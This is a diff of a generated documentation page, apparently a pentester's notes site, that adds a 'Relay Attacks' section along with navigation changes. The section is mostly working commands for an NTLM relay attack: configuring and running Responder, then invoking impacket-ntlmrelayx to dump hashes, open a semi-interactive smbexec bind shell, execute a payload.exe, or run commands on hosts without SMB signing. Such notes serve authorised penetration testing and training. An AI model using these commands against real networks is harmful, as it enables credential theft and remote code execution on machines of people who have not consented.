@@ -99,6 +99,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#responder-ntlmrelayx" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -838,7 +843,7 @@
   
   
   <span class="md-ellipsis">
-    Index
+    Under Construction
     
   </span>
   
@@ -2677,6 +2682,29 @@
   
   
     <li class="md-nav__item">
+      <a href="../../Initial%20Access%20%26%20Delivery/IPv6%20Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    IPv6 Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../Initial%20Access%20%26%20Delivery/LLMNR%20Poisoning/" class="md-nav__link">
         
   
@@ -2981,29 +3009,6 @@
   
   
     <li class="md-nav__item">
-      <a href="../IPv6%20Attacks/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    IPv6 Attacks
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
       <a href="../Kerberos%20Double%20Hop/" class="md-nav__link">
         
   
@@ -3103,6 +3108,19 @@
       
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Relay Attacks
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -3114,6 +3132,32 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#responder-ntlmrelayx" class="md-nav__link">
+    <span class="md-ellipsis">
+      Responder + ntlmrelayx
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -3619,6 +3663,23 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#responder-ntlmrelayx" class="md-nav__link">
+    <span class="md-ellipsis">
+      Responder + ntlmrelayx
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -3638,7 +3699,36 @@
 
   <h1>Relay Attacks</h1>
 
-
+<p>Relay captures hashes to target machine for various types of access.
+- Only works if SMB signing is disabled or "not required"
+- Relayed creds MUST be admin on the machine</p>
+<h2 id="responder-ntlmrelayx">Responder + ntlmrelayx</h2>
+<hr />
+<p>Edit responder conf:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>nano<span class="w"> </span>/etc/responder/Responder.conf
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nv">SMB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>On<span class="w"> </span>---&gt;<span class="w"> </span>Off
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nv">HTTP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>on<span class="w"> </span>---&gt;<span class="w"> </span>Off
+</span></code></pre></div>
+Make targets list
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;TargetIP&gt;&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>targets.txt
+</span></code></pre></div>
+Run responder
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>eth0<span class="w"> </span>-wv
+</span></code></pre></div>
+Start ntlmrelayx with any of these options
+<strong>Dump hashes</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sudo<span class="w"> </span>impacket-ntlmrelayx<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support
+</span></code></pre></div>
+<strong>Get semi-interactive smbexec bind shell</strong> (<code>nc localhost 11000</code>)
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>sudo<span class="w"> </span>impacket-ntlmrelayx<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-i
+</span></code></pre></div>
+<strong>Execute payload</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>sudo<span class="w"> </span>impacket-ntlmrelayx<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-e<span class="w"> </span>payload.exe
+</span></code></pre></div>
+<strong>Execute Command</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>sudo<span class="w"> </span>impacket-ntlmrelayx<span class="w"> </span>-tf<span class="w"> </span>targets.txt<span class="w"> </span>-smb2support<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;whoami&#39;</span>
+</span></code></pre></div>
+Wait for auth attempt (or coerce auth attempt)</p>
 
 
 
